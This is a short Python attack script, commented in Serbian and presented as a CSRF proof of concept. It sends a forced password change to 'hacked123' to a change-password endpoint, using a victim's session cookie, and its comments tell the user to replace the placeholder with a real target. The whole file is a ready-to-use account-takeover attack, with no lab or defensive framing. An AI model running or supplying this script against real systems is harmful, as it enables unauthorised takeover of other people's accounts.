import requests

# Primer mete (izmeni u pravi target!)
TARGET_URL = "http://example.com/change-password"
COOKIES = {"session": "abc123"}  # Ovde ide sesija žrtve ako je poznata

def run_csrf_poc():
    data = {
        "new_password": "hacked123",
        "confirm_password": "hacked123"
    }

    print(f"[+] Šaljem CSRF zahtev ka: {TARGET_URL}")
    try:
        res = requests.post(TARGET_URL, data=data, cookies=COOKIES)
        if res.status_code == 200:
            print("[!] CSRF pokušaj poslat. Proveri da li je uspešan!")
        else:
            print(f"[-] Neuspešno. Status kod: {res.status_code}")
    except Exception as e:
        print(f"[X] Greška: {e}")

if __name__ == "__main__":
    run_csrf_poc()
